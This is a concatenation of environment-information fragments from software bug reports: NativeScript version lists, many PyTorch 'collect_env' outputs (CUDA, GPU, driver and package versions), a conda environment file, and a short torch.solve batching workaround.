- cli: 5.1.0 - cross-platform modules: 5.1.0 - android runtime: 5.1.0 - ios runtime: - - plugin(s): -
- cli: 5.0.1 - cross-platform modules: 5.1.1 - android runtime: 5.0.0 - ios runtime: 5.0.0 - plugin(s): "nativescript-angular": "^7.0.3", "nativescript-audio": "^4.3.5", "nativescript-bottom-navigation": "^1.3.0", "nativescript-checkbox": "^3.0.3", "nativescript-feedback": "^1.2.0", "nativescript-localize": "^3.0.6", "nativescript-masked-text-field": "^3.0.2", "nativescript-ng-ripple": "^2.0.0", "nativescript-pager": "^8.0.2", "nativescript-plugin-firebase": "^7.6.0", "nativescript-purchase": "^2.0.5", "nativescript-sqlite": "^2.2.1", "nativescript-telephony": "^1.0.4", "nativescript-theme-core": "~1.0.4", "nativescript-tslib": "^1.9.1-r1", "nativescript-ui-autocomplete": "^3.9.0", "nativescript-ui-calendar": "^3.7.0", "nativescript-ui-chart": "^3.7.0", "nativescript-ui-gauge": "^3.6.0", "nativescript-ui-listview": "^5.0.0", "nativescript-ui-sidedrawer": "^4.3.0",
- cli: 5.0 - cross-platform modules: 5.0.5 - ios runtime: 5.0
- cli: 5.0.3 - cross-platform modules: 5.0.5 - ios runtime: 5.0.0 - plugin(s): nativescript-ui-sidedrawer: 5.0.0
- cli: 5.0.2 - cross-platform modules: 5.0.5 - android runtime: 5.0.0
- cli: 5.0.1 - cross-platform modules: 5.0.3 - android runtime: 5.0.0 - ios runtime: 5.0.0
- cli: 5.0.1 - core modules: 5.0.2 - android runtime: 5.0.0 - ios runtime: 5.0.0
- cli: 5.0.0 - cross-platform modules: 5.0.2 - android runtime: 5.0.0 - ios runtime: 5.0.0 this bug also occured on ns 4.2.
- cli: 5.1.0 - cross-platform modules: 5.0.0 - android runtime: 5.0.0 - ios runtime:5.0.0
- cli: - cross-platform modules: 4.2.1 - android runtime: 4.2.0 - ios runtime: - - plugin(s): -
- cli: 5.0.0 - cross-platform modules: 5.0.1 - android runtime: 5.0.0 - ios runtime: 5.0.0
- cli: 4.2.4 - cross-platform modules: - android runtime: 4.1.3 - ios runtime: 4.1.0 - plugin(s):
pytorch version: 1.7.0a0+db4690c
is debug build: true
cuda used to build pytorch: 10.1
rocm used to build pytorch: n/a os: ubuntu 18.04.3 lts (x86_64)
gcc version: (ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
clang version: 8.0.0 (tags/release_800/final)
cmake version: version 3.14.0 python version: 3.8 (64-bit runtime)
is cuda available: true
cuda runtime version: 10.1.105
gpu models and configuration: gpu 0: quadro gp100
gpu 1: quadro gp100 nvidia driver version: 440.82
cudnn version: could not collect
hip runtime version: n/a
miopen runtime version: n/a versions of relevant libraries:
[pip3] numpy==1.19.1
[pip3] torch==1.7.0a0
[pip3] torchvision==0.7.0
[conda] blas 1.0 mkl [conda] magma-cuda101 2.5.2 1 pytorch
[conda] mkl 2020.1 217 [conda] mkl-include 2020.1 217 [conda] mkl-service 2.3.0 py38he904b0f_0 [conda] mkl_fft 1.2.0 py38h23d657b_0 [conda] mkl_random 1.1.1 py38h0573a6f_0 [conda] numpy 1.19.1 py38hbc911f0_0 [conda] numpy-base 1.19.1 py38hfa32c7d_0 [conda] torch 1.7.0a0 dev_0 <develop>
[conda] torchvision 0.7.0 pypi_0 pypi cc @ezyang @gchanan @zou3519 @mruberry @vitalyfedyunin @vincentqb @vishwakftw @jianyuh @nikitaved @pearu cc @xwang233
- pytorch version (e.g., 1.5):1.5 - os (e.g., linux):centos7 - how you installed pytorch (`conda`, `pip`, source):source - build command you used (if compiling from source): - python version:3.6.8 - cuda/cudnn version:10.0 - gpu models and configuration:k40 - any other relevant information:
pytorch version: 1.5.1
is debug build: no
cuda used to build pytorch: 10.1 os: ubuntu 16.04.5 lts
gcc version: (ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
cmake version: version 3.5.1 python version: 3.6
is cuda available: yes
cuda runtime version: 10.0.130
gpu models and configuration: gpu 0: tesla v100-pcie-32gb
nvidia driver version: 418.87.00
cudnn version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.4.1 versions of relevant libraries:
[pip] numpy==1.16.4
[pip] torch==1.5.1
[pip] torchvision==0.6.0a0+35d732a
[conda] _pytorch_select 0.2 gpu_0
[conda] blas 1.0 mkl
[conda] cudatoolkit 10.1.243 h6bb024c_0
[conda] magma-cuda100 2.5.0 1 pytorch
[conda] mkl 2019.4 243
[conda] mkl-include 2019.4 243
[conda] mkl-service 2.0.2 py36h7b6447c_0
[conda] mkl_fft 1.0.12 py36ha843d7b_0
[conda] mkl_random 1.0.2 py36hd81dba3_0
[conda] numpy 1.16.4 py36h7e9f1db_0
[conda] numpy-base 1.16.4 py36hde5b4d6_0
[conda] pytorch 1.5.1 py3.6_cuda10.1.243_cudnn7.6.3_0 pytorch
[conda] torchvision 0.6.1 py36_cu101 pytorch cc @ngimel @csarofeen @ptrblck
collecting environment information...
pytorch version: 1.5.0
is debug build: no
cuda used to build pytorch: none os: mac osx 10.15.5
gcc version: could not collect
cmake version: could not collect python version: 3.7
is cuda available: no
cuda runtime version: no cuda
gpu models and configuration: no cuda
nvidia driver version: no cuda
cudnn version: no cuda versions of relevant libraries:
[pip3] numpy==1.18.5
[pip3] torch==1.5.0
[pip3] torchvision==0.6.0a0+82fd1c8
[conda] blas 2.15 mkl conda-forge
[conda] libblas 3.8.0 15_mkl conda-forge
[conda] libcblas 3.8.0 15_mkl conda-forge
[conda] liblapack 3.8.0 15_mkl conda-forge
[conda] liblapacke 3.8.0 15_mkl conda-forge
[conda] mkl 2020.1 218 conda-forge
[conda] numpy 1.18.5 py37h7687784_0 conda-forge
[conda] pytorch 1.5.0 py3.7_0 pytorch
[conda] torchvision 0.6.0 py37_cpu pytorch
``` - pytorch version: tested on 1.4/1.5 - os: ubuntu 18.04 - how you installed pytorch (`conda`, `pip`, source): conda - python version: 3.7/3.8 - cuda/cudnn version: 10.1 - gpu models and configuration: gtx 1070 - any other relevant information:
``` cc @ezyang @gchanan @zou3519 @ngimel @csarofeen @ptrblck @alband @mruberry @vitalyfedyunin
``` ``` - pytorch version (e.g., 1.0): 1.5.0 - os (e.g., linux): ubuntu linux 18.04.2 - how you installed pytorch (`conda`, `pip`, source): conda - build command you used (if compiling from source): n/a - python version: 3.7.7 - cuda/cudnn version: 10.1/7.6.5 (also from conda) - gpu models and configuration: 3x tesla v100 - any other relevant information:
here is the yaml of my conda environment: ```yaml
channels: - pytorch - defaults - conda-forge
dependencies: - _libgcc_mutex=0.1=main - _tflow_select=2.1.0=gpu - absl-py=0.9.0=py37_0 - asn1crypto=1.3.0=py37_0 - astor=0.8.0=py37_0 - blas=1.0=mkl - blinker=1.4=py37_0 - c-ares=1.15.0=h7b6447c_1001 - ca-certificates=2020.1.1=0 - cachetools=3.1.1=py_0 - certifi=2020.4.5.1=py37_0 - cffi=1.14.0=py37h2e261b9_0 - chardet=3.0.4=py37_1003 - click=7.1.1=py_0 - cryptography=2.8=py37h1ba5d50_0 - cudatoolkit=10.1.243=h6bb024c_0 - cudnn=7.6.5=cuda10.1_0 - cupti=10.1.168=0 - cycler=0.10.0=py37_0 - cython=0.29.15=py37he6710b0_0 - dbus=1.13.12=h746ee38_0 - expat=2.2.6=he6710b0_0 - fontconfig=2.13.0=h9420a91_0 - freetype=2.9.1=h8a8886c_1 - future=0.18.2=py37_0 - gast=0.2.2=py37_0 - glib=2.63.1=h5a9c865_0 - google-auth=1.13.1=py_0 - google-auth-oauthlib=0.4.1=py_2 - google-pasta=0.2.0=py_0 - grpcio=1.27.2=py37hf8bcb03_0 - gst-plugins-base=1.14.0=hbbd80ab_1 - gstreamer=1.14.0=hb453b48_1 - h5py=2.10.0=py37h7918eee_0 - hdf5=1.10.4=hb1b8bf9_0 - icu=58.2=h9c2bf20_1 - idna=2.9=py_1 - intel-openmp=2020.0=166 - jpeg=9b=h024ee3a_2 - keras-applications=1.0.8=py_0 - keras-preprocessing=1.1.0=py_1 - kiwisolver=1.1.0=py37he6710b0_0 - ld_impl_linux-64=2.33.1=h53a641e_7 - libedit=3.1.20181209=hc058e9b_0 - libffi=3.2.1=hd88cf55_4 - libgcc-ng=9.1.0=hdf63c60_0 - libgfortran-ng=7.3.0=hdf63c60_0 - libpng=1.6.37=hbc83047_0 - libprotobuf=3.11.4=hd408876_0 - libstdcxx-ng=9.1.0=hdf63c60_0 - libuuid=1.0.3=h1bed415_2 - libxcb=1.13=h1bed415_1 - libxml2=2.9.9=hea5a465_1 - markdown=3.1.1=py37_0 - matplotlib=3.1.3=py37_0 - matplotlib-base=3.1.3=py37hef1b27d_0 - mkl=2020.0=166 - mkl-service=2.3.0=py37he904b0f_0 - mkl_fft=1.0.15=py37ha843d7b_0 - mkl_random=1.1.0=py37hd6b4f25_0 - ncurses=6.2=he6710b0_0 - ninja=1.9.0=py37hfd86e86_0 - numpy=1.18.1=py37h4f9e942_0 - numpy-base=1.18.1=py37hde5b4d6_1 - oauthlib=3.1.0=py_0 - openssl=1.1.1g=h7b6447c_0 - opt_einsum=3.1.0=py_0 - pcre=8.43=he6710b0_0 - pip=20.0.2=py37_1 - portalocker=1.5.2=py37_0 - protobuf=3.11.4=py37he6710b0_0 - pyasn1=0.4.8=py_0 - pyasn1-modules=0.2.7=py_0 - pycparser=2.20=py_0 - pyjwt=1.7.1=py37_0 - pyopenssl=19.1.0=py37_0 - pyparsing=2.4.6=py_0 - pyqt=5.9.2=py37h05f1152_2 - pysocks=1.7.1=py37_0 - python=3.7.7=hcf32534_0_cpython - python-dateutil=2.8.1=py_0 - pytorch=1.5.0=py3.7_cuda10.1.243_cudnn7.6.3_0 - qt=5.9.7=h5867ecd_1 - readline=8.0=h7b6447c_0 - regex=2020.4.4=py37h7b6447c_0 - requests=2.23.0=py37_0 - requests-oauthlib=1.3.0=py_0 - rsa=4.0=py_0 - scipy=1.4.1=py37h0b6359f_0 - setuptools=46.1.3=py37_0 - sip=4.19.8=py37hf484d3e_0 - six=1.14.0=py37_0 - sqlite=3.31.1=h62c20be_1 - tensorboard=2.1.0=py3_0 - tensorboardx=2.0=py_0 - tensorflow=2.1.0=gpu_py37h7a4bb67_0 - tensorflow-base=2.1.0=gpu_py37h6c5654b_0 - tensorflow-estimator=2.1.0=pyhd54b08b_0 - tensorflow-gpu=2.1.0=h0d30ee6_0 - termcolor=1.1.0=py37_1 - tk=8.6.8=hbc83047_0 - tornado=6.0.4=py37h7b6447c_1 - tqdm=4.45.0=py_0 - typing=3.6.4=py37_0 - urllib3=1.25.8=py37_0 - werkzeug=1.0.1=py_0 - wheel=0.34.2=py37_0 - wrapt=1.12.1=py37h7b6447c_1 - xz=5.2.5=h7b6447c_0 - zlib=1.2.11=h7b6447c_3 - pip: - mecab-python3==0.996.5 - sacrebleu==1.4.8
prefix: /data/mwright/anaconda3/envs/gpu
``` cc @ezyang @gchanan @zou3519 @malfet
cublas is being loaded from a vanilla public cuda 10.2 install:
(python373) $ ld_debug=libs python transpose2d.py 2>&1 | grep cublas ..
8876: calling init: /home/mcarilli/cuda_versions/10.2_files/cuda-toolkit/lib64/libcublaslt.so.10 8876: calling init: /home/mcarilli/cuda_versions/10.2_files/cuda-toolkit/lib64/libcublas.so.10
``` pytorch is based on a recent-ish master (`__version__` is unique because it's a source build from a local commit with debugging print statements)
cc @ezyang @gchanan @zou3519 @csarofeen @ptrblck
collecting environment information...
pytorch version: 1.4.0
is debug build: no
cuda used to build pytorch: 10.1 os: ubuntu 16.04.6 lts
gcc version: (ubuntu 9.2.1-17ubuntu1~16.04) 9.2.1 20191102
cmake version: version 3.15.1 python version: 3.8
is cuda available: yes
cuda runtime version: 10.2.89
gpu models and configuration: gpu 0: geforce rtx 2080 ti
nvidia driver version: 440.64
cudnn version: /usr0/local/cuda-9.0/lib64/libcudnn.so.7.0.5 versions of relevant libraries:
[pip] numpy==1.18.1
[pip] torch==1.4.0
[pip] torchvision==0.5.0
[conda] cudatoolkit 10.1.243 h6bb024c_0 [conda] mkl 2020.0 166 conda-forge
[conda] numpy 1.18.1 py38h8854b6b_1 conda-forge
[conda] pytorch 1.4.0 py3.8_cuda10.1.243_cudnn7.6.3_0 pytorch
[conda] torchvision 0.5.0 py38_cu101 pytorch ``` cc @ezyang @gchanan @zou3519 @ngimel @vincentqb @vishwakftw @ssnl @jianyuh
pytorch version: 1.4.0
is debug build: no
cuda used to build pytorch: 10.0 os: ubuntu 18.04.1 lts
gcc version: (ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0
cmake version: could not collect python version: 3.6
is cuda available: yes
cuda runtime version: could not collect
gpu models and configuration:
gpu 0: tesla v100-sxm2-32gb
gpu 1: tesla v100-sxm2-32gb
gpu 2: tesla v100-sxm2-32gb
gpu 3: tesla v100-sxm2-32gb
gpu 4: tesla v100-sxm2-32gb
gpu 5: tesla v100-sxm2-32gb
gpu 6: tesla v100-sxm2-32gb
gpu 7: tesla v100-sxm2-32gb nvidia driver version: 410.79
cudnn version: could not collect versions of relevant libraries:
[pip] numpy==1.18.1
[pip] torch==1.4.0
[pip] torchvision==0.5.0
[conda] blas 1.0 mkl
[conda] mkl 2020.0 166
[conda] mkl-service 2.3.0 py36he904b0f_0
[conda] mkl_fft 1.0.15 py36ha843d7b_0
[conda] mkl_random 1.1.0 py36hd6b4f25_0
[conda] pytorch 1.4.0 py3.6_cuda10.0.130_cudnn7.6.3_0 pytorch
[conda] torchvision 0.5.0 py36_cu100 pytorch cc @ezyang @gchanan @zou3519 @ngimel
- pytorch version (e.g., 1.0): 1.4.0 - os (e.g., linux): mac osx 10.15.2 - how you installed pytorch (`conda`, `pip`, source): pip - build command you used (if compiling from source): - python version: 3.6 - cuda/cudnn version: n/a - gpu models and configuration: n/a - any other relevant information: above code is from "[pytorch\'s beginner tutorial (saving loading models)]( "
``` ``` - pytorch version (e.g., 1.0): e4db0a5 - os (e.g., linux): windows - how you installed pytorch (`conda`, `pip`, source): source - build command you used (if compiling from source): python setup.py build - python version: 3.8 - cuda/cudnn version: n/a - gpu models and configuration: n/a - any other relevant information:
- pytorch version (e.g., 1.0): 1.3 (also verified still present in latest master) - os (e.g., linux): linux - python version: 3.7 - cuda/cudnn version: 9.0.176 - gpu models and configuration: v100 cc @ezyang @gchanan @zou3519 @csarofeen @ptrblck @ngimel
- pytorch version (e.g., 1.0): 1.3.0+cu100 - os (e.g., linux): linux - how you installed pytorch (`conda`, `pip`, source): conda - build command you used (if compiling from source): - python version: 3.6 - cuda/cudnn version: 10.0.130 - gpu models and configuration: quadro gp100 cc @ezyang @gchanan @zou3519 @csarofeen @ptrblck @ngimel
pytorch version: 1.4.0.dev20191112
is debug build: no
cuda used to build pytorch: 9.2 os: ubuntu 18.04.1 lts
gcc version: (ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
cmake version: version 3.10.2 python version: 3.7 nvidia driver version: 410.79
cudnn version: could not collect versions of relevant libraries:
[pip] numpy==1.17.3
[pip] torch==1.4.0.dev20191112
[pip] torchfile==0.1.0
[pip] torchnet==0.0.4
[pip] torchvision==0.5.0a0+bfd4b2a
[pip] torchviz==0.0.1
[conda] blas 1.0 mkl
[conda] mkl 2019.4 243
[conda] mkl-service 2.3.0 py37he904b0f_0
[conda] mkl_fft 1.0.15 py37ha843d7b_0
[conda] mkl_random 1.1.0 py37hd6b4f25_0
[conda] pytorch 1.4.0.dev20191112 py3.7_cuda9.2.148_cudnn7.6.3_0 pytorch-nightly
[conda] torchfile 0.1.0 pypi_0 pypi
[conda] torchnet 0.0.4 pypi_0 pypi
[conda] torchvision 0.5.0.dev20191112 py37_cu92 pytorch-nightly
[conda] torchviz 0.0.1 dev_0 <develop>
``` cc @ssnl
pytorch version: 1.0.0
is debug build: no
cuda used to build pytorch: 9.0.176 os: debian gnu/linux 10 (buster)
gcc version: (debian 8.3.0-6) 8.3.0
cmake version: version 3.13.4 python version: 3.7
is cuda available: no
cuda runtime version: no cuda
gpu models and configuration: no cuda
nvidia driver version: no cuda
cudnn version: no cuda versions of relevant libraries:
[pip] numpy==1.16.4
[pip] numpydoc==0.9.1
[pip] torch==1.0.0
[conda] blas 1.0 mkl [conda] mkl 2019.4 243 [conda] mkl-service 2.0.2 py37h7b6447c_0 [conda] mkl_fft 1.0.12 py37ha843d7b_0 [conda] mkl_random 1.0.2 py37hd81dba3_0 [conda] torch 1.0.0 pypi_0 pypi
pytorch version: 1.1.0
cuda version: 9.0
cudnn version: 7.0.5
pytorch version: 1.2.0
is debug build: no
cuda used to build pytorch: 10.0.130 os: ubuntu 16.04.5 lts
gcc version: (ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
cmake version: version 3.5.1 python version: 3.7
is cuda available: yes
cuda runtime version: could not collect
gpu models and configuration: gpu 0: tesla v100-sxm2-32gb
gpu 1: tesla v100-sxm2-32gb
gpu 2: tesla v100-sxm2-32gb
gpu 3: tesla v100-sxm2-32gb
gpu 4: tesla v100-sxm2-32gb
gpu 5: tesla v100-sxm2-32gb
gpu 6: tesla v100-sxm2-32gb
gpu 7: tesla v100-sxm2-32gb nvidia driver version: 410.48
cudnn version: could not collect versions of relevant libraries:
[pip3] numpy==1.17.1
[pip3] torch==1.2.0
[pip3] torchfile==0.1.0
[pip3] torchnet==0.0.4
[pip3] torchvision==0.4.0 cc @vishwakftw @ssnl @jianyuh
pytorch version: 1.2.0
is debug build: no
cuda used to build pytorch: 9.2.148 os: ubuntu 16.04.6 lts
gcc version: (ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
cmake version: version 3.5.1 python version: 3.6
is cuda available: yes
cuda runtime version: could not collect
gpu models and configuration: gpu 0: geforce gtx 980m
nvidia driver version: 418.40.04
cudnn version: probably one of the following:
/usr/lib/x86_64-linux-gnu/libcudnn.so.7.5.0
/usr/local/cuda-9.2/targets/x86_64-linux/lib/libcudnn.so.7.6.1 versions of relevant libraries:
[pip] numpy==1.15.4
[pip] torch==1.2.0
[pip] torchgeometry==0.1.2rc1
[pip] torchvision==0.4.0a0+9232c4a
[conda] blas 1.0 mkl [conda] mkl 2019.1 144 [conda] mkl_fft 1.0.6 py36hd81dba3_0 [conda] mkl_random 1.0.2 py36hd81dba3_0 [conda] pytorch 1.2.0 py3.6_cuda9.2.148_cudnn7.6.2_0 pytorch
[conda] torchvision 0.4.0 py36_cu92 pytorch
i'm seeing this both on native linux installs, and in wsl
here's my wsl info: ```
$ .venv/bin/python ./collect_env.py
collecting environment information...
pytorch version: 1.2.0
is debug build: no
cuda used to build pytorch: 10.0.130 os: ubuntu 16.04.3 lts
gcc version: (ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
cmake version: version 3.5.1 python version: 3.5
is cuda available: no
cuda runtime version: no cuda
gpu models and configuration: no cuda
nvidia driver version: no cuda
cudnn version: no cuda versions of relevant libraries:
[pip] could not collect
[conda] could not collect
run from inside the container:
pytorch version: 1.2.0
is debug build: no
cuda used to build pytorch: 10.0.130 os: ubuntu 18.04.2 lts
gcc version: (ubuntu 7.4.0-1ubuntu1~18.04) 7.4.0
cmake version: could not collect python version: 3.7
is cuda available: yes
cuda runtime version: 10.0.130
gpu models and configuration: gpu 0: geforce rtx 2080 ti
nvidia driver version: 430.40
cudnn version: could not collect versions of relevant libraries:
[pip] numpy==1.16.4
[pip] torch==1.2.0
[conda] blas 1.0 mkl [conda] mkl 2019.4 243 [conda] mkl_fft 1.0.12 py37ha843d7b_0 [conda] mkl_random 1.0.2 py37hd81dba3_0 [conda] pytorch 1.2.0 py3.7_cuda10.0.130_cudnn7.6.2_0 pytorch
collecting environment information...
pytorch version: 1.0.1.post2
is debug build: no
cuda used to build pytorch: 10.0.130 os: ubuntu 18.04.2 lts
gcc version: (crosstool-ng fa8859cb) 7.2.0
cmake version: could not collect python version: 3.5
is cuda available: yes
cuda runtime version: 10.0.130
gpu models and configuration:
gpu 0: tesla p40
gpu 1: tesla p40
gpu 2: tesla p40
gpu 3: tesla p40
gpu 4: tesla p40
gpu 5: tesla p40
gpu 6: tesla p40
gpu 7: tesla p40 nvidia driver version: 410.79
cudnn version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.4.2 versions of relevant libraries:
[pip3] numpy==1.15.2
[conda] mkl 2018.0.3 1 defaults
[conda] mkl_fft 1.0.6 py35_0 conda-forge
[conda] mkl_random 1.0.1 py35_0 conda-forge
[conda] nomkl 2.0 0 defaults
[conda] numexpr 2.6.5 py35_nomklhaa809a4_0 [nomkl] defaults
[conda] pytorch 1.0.1 py3.5_cuda10.0.130_cudnn7.4.2_2 pytorch
[conda] torch 0.4.1 <pip>
[conda] torchvision 0.2.2 py_3 pytorch cc @ezyang @gchanan @zou3519 @ngimel
- pytorch: 1.1.0 - os: linux - python version: 3.7 - cuda/cudnn version: 10.0.130 - gpu: v-100
pytorch version: 1.1.0
is debug build: no
cuda used to build pytorch: 9.0.176 os: ubuntu 18.04.2 lts
gcc version: (homebrew gcc 5.5.0_4) 5.5.0
cmake version: could not collect python version: 3.7
is cuda available: yes
cuda runtime version: 9.1.85
gpu models and configuration: gpu 0: geforce gtx 1080 ti
nvidia driver version: 390.116
cudnn version: could not collect versions of relevant libraries:
[pip] numpy==1.17.0
[pip] pytorch-lightning==0.3.6.9
[pip] torch==1.1.0
[pip] torchkge==0.10.3
[pip] torchvision==0.3.0
[conda] blas 2.10 mkl conda-forge
[conda] libblas 3.8.0 10_mkl conda-forge
[conda] libcblas 3.8.0 10_mkl conda-forge
[conda] liblapack 3.8.0 10_mkl conda-forge
[conda] liblapacke 3.8.0 10_mkl conda-forge
[conda] mkl 2019.4 243
[conda] pytorch 1.1.0 py3.7_cuda9.0.176_cudnn7.5.1_0 pytorch
[conda] pytorch-lightning 0.3.6.9 pypi_0 pypi
[conda] torchkge 0.10.3 dev_0 <develop>
[conda] torchvision 0.3.0 py37_cu9.0.176_1 pytorch cc @ezyang @gchanan @zou3519
<summary> environment information </summary>
pytorch version: n/a
is debug build: n/a
cuda used to build pytorch: n/a os: pop!_os 18.10
gcc version: (ubuntu 8.3.0-6ubuntu1~18.10) 8.3.0
cmake version: version 3.12.1 python version: 3.7
is cuda available: n/a
cuda runtime version: 10.0.130
gpu models and configuration: gpu 0: geforce gtx 1070 with max-q design
nvidia driver version: 410.78
cudnn version: /usr/lib/cuda-10.0/lib64/libcudnn.so.7.4.1 versions of relevant libraries:
[pip3] numpy==1.17.0
[pip3] torch==1.1.0
[pip3] torchvision==0.3.0
[conda] blas 1.0 mkl [conda] mkl 2019.1 144 [conda] mkl-service 1.1.2 py37he904b0f_5 [conda] mkl_fft 1.0.6 py37hd81dba3_0 [conda] mkl_random 1.0.2 py37hd81dba3_0
</details> cc @vincentqb @fritzo @neerajprad @alicanb @vishwakftw @nikitaved @vitalyfedyunin @ngimel
pytorch version: 1.1.0
is debug build: no
cuda used to build pytorch: 10.0.130 os: ubuntu 16.04.5 lts
gcc version: (crosstool-ng 1.23.0.449-a04d0) 7.3.0
cmake version: version 3.7.2 python version: 3.7
is cuda available: yes
cuda runtime version: could not collect
gpu models and configuration:
gpu 0: quadro p5000
gpu 1: geforce rtx 2080 nvidia driver version: 410.73
cudnn version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.3.1 versions of relevant libraries:
[pip] numpy==1.16.4
[pip] torch==1.1.0
[pip] torchvision==0.3.0
[conda] mkl 2019.4 243
[conda] torch 1.1.0 <pip>
[conda] torchvision 0.3.0 <pip> edit [t-vi]: add backticks around source cc @ezyang @gchanan @zou3519 @jerryzh168 @vitalyfedyunin @ngimel @mruberry
collecting environment information...
pytorch version: n/a
is debug build: n/a
cuda used to build pytorch: n/a os: fedora release 29 (twenty nine)
gcc version: (gcc) 8.2.1 20180801 (red hat 8.2.1-2)
cmake version: version 3.14.0 python version: 3.7
is cuda available: n/a
cuda runtime version: 10.1.168
gpu models and configuration: gpu 0: geforce rtx 2080
nvidia driver version: 430.26
cudnn version: could not collect versions of relevant libraries:
[pip] numpy==1.16.4
[conda] blas 1.0 mkl [conda] mkl 2019.4 243 [conda] mkl-include 2019.4 243 [conda] mkl_fft 1.0.12 py37ha843d7b_0 [conda] mkl_random 1.0.2 py37hd81dba3_0
- pytorch version (e.g., 1.0): master - os (e.g., linux): centos 7 / ubuntu 18.04 - how you installed pytorch (`conda`, `pip`, source): source - build command you used (if compiling from source): cmake+ninja+gcc8 - python version: 3.6 - cuda/cudnn version: 10.1
collecting environment information...
pytorch version: 1.1.0
is debug build: no
cuda used to build pytorch: 10.0.130 os: ubuntu 16.04.6 lts
gcc version: (ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
cmake version: version 3.5.1 python version: 3.7
is cuda available: yes
cuda runtime version: could not collect
gpu models and configuration: gpu 0: titan xp
nvidia driver version: 418.39
cudnn version: /usr/local/cuda-10.1/targets/x86_64-linux/lib/libcudnn.so.7.5.1 versions of relevant libraries:
[pip] numpy==1.16.4
[pip] torch==1.1.0
[pip] torchvision==0.3.0
[conda] blas 1.0 mkl
[conda] mkl 2019.4 243
[conda] mkl_fft 1.0.12 py37ha843d7b_0
[conda] mkl_random 1.0.2 py37hd81dba3_0
[conda] pytorch 1.1.0 py3.7_cuda10.0.130_cudnn7.5.1_0 pytorch
[conda] torchvision 0.3.0 py37_cu10.0.130_1 pytorch
``` ## additional notes
for now, i use this snippet to get around with the bug
but the runtime becomes similar to that runs on cpu only.
def gpu_solve(as, bs): batch_size, n, n = as.shape ws = as.new(size=(*as.shape[:2], 1)) smb = 65535 temp_lr = as.new(size=(smb, *as.shape[1:])) for i in range(batch_size // smb + 1): start = smb * i end = smb * (i + 1) if i < batch_size // smb else batch_size torch.solve(bs[start:end], as[start:end], out=(ws[start:end], temp_lr[0:end-start])) return ws
``` suspect this issue relates to [this issue](
collecting environment information...
pytorch version: 1.2.0a0+0885dd2
is debug build: no
cuda used to build pytorch: 10.1.168 os: ubuntu 16.04.6 lts
gcc version: (ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
cmake version: version 3.5.1 python version: 3.6
is cuda available: yes
cuda runtime version: 10.1.168
gpu models and configuration: gpu 0: tesla v100-dgxs-16gb
gpu 1: tesla v100-dgxs-16gb
gpu 2: tesla v100-dgxs-16gb
gpu 3: tesla v100-dgxs-16gb nvidia driver version: 410.48
cudnn version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.0 versions of relevant libraries:
[pip] msgpack-numpy==0.4.3.2
[pip] numpy==1.16.4
[pip] torch==1.2.0a0+0885dd2
[pip] torchtext==0.4.0
[pip] torchvision==0.2.1
[conda] magma-cuda100 2.1.0 5 local
[conda] mkl 2019.1 144 [conda] mkl-include 2019.1 144 [conda] torch 1.2.0a0+0885dd2 pypi_0 pypi
[conda] torchtext 0.4.0 pypi_0 pypi
[conda] torchvision 0.2.1 pypi_0 pypi
pytorch version: 1.0.1
is debug build: no
cuda used to build pytorch: 10.1.105 os: arch linux
gcc version: (gcc) 8.3.0
cmake version: version 3.14.4 python version: 3.7
is cuda available: yes
cuda runtime version: 10.1.168
gpu models and configuration: gpu 0: geforce gtx 1060 6gb
nvidia driver version: 430.14
cudnn version: /usr/lib/libcudnn.so.7.5.1 versions of relevant libraries:
[pip3] numpy==1.16.3
[pip3] torch==1.0.1
[pip3] torchvision==0.2.2.post3
[conda] could not collect
pytorch version: 1.0.1.post2
is debug build: no
cuda used to build pytorch: 9.0.176 os: debian gnu/linux 9.4 (stretch)
gcc version: (debian 6.3.0-18+deb9u1) 6.3.0 20170516
cmake version: version 3.7.2 python version: 3.7
is cuda available: yes
cuda runtime version: could not collect
gpu models and configuration: gpu 0: tesla k80
gpu 1: tesla k80
gpu 2: tesla k80
gpu 3: tesla k80 nvidia driver version: 387.26
cudnn version: could not collect versions of relevant libraries:
[pip3] numpy==1.12.1
[conda] blas 1.0 mkl [conda] mkl 2019.1 144 [conda] mkl-service 1.1.2 py37h90e4bf4_5 [conda] mkl_fft 1.0.10 py37ha843d7b_0 [conda] mkl_random 1.0.2 py37hd81dba3_0 [conda] pytorch 1.0.1 py3.7_cuda9.0.176_cudnn7.4.2_2 pytorch
[conda] torchvision 0.2.2 py_3 pytorch
collecting environment information...
pytorch version: 1.0.1.post2
is debug build: no
cuda used to build pytorch: 10.0.130 os: ubuntu 16.04.5 lts
gcc version: (ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609
cmake version: version 3.5.1 python version: 3.6
is cuda available: yes
cuda runtime version: 10.0.130
gpu models and configuration: gpu 0: tesla v100-dgxs-32gb
gpu 1: tesla v100-dgxs-32gb
gpu 2: tesla v100-dgxs-32gb
gpu 3: tesla v100-dgxs-32gb nvidia driver version: 410.79
cudnn version: probably one of the following:
/usr/lib/x86_64-linux-gnu/libcudnn.so.7.4.1 versions of relevant libraries:
[pip] could not collect
[conda] blas 1.0 mkl [conda] magma-cuda100 2.1.0 5 local
[conda] mkl 2019.0 118 [conda] mkl-include 2019.0 118 [conda] mkl_fft 1.0.6 py36h7dd41cf_0 [conda] mkl_random 1.0.1 py36h4414c95_1 [conda] pytorch 1.0.1 py3.6_cuda10.0.130_cudnn7.4.2_2 pytorch
[conda] torch 1.0.0a0 pypi_0 pypi
[conda] torchtext 0.3.0 pypi_0 pypi
[conda] torchvision 0.2.1 pypi_0 pypi
pytorch master 066d1584 (mar 11, 2019)
cuda 9.2.88
collecting environment information...
pytorch version: n/a
is debug build: n/a
cuda used to build pytorch: n/a os: ubuntu 18.04.2 lts
gcc version: (ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0
cmake version: version 3.13.4 python version: 3.7
is cuda available: n/a
cuda runtime version: 10.1.105
gpu models and configuration: gpu 0: geforce gt 1030
gpu 1: geforce gtx 1080 ti
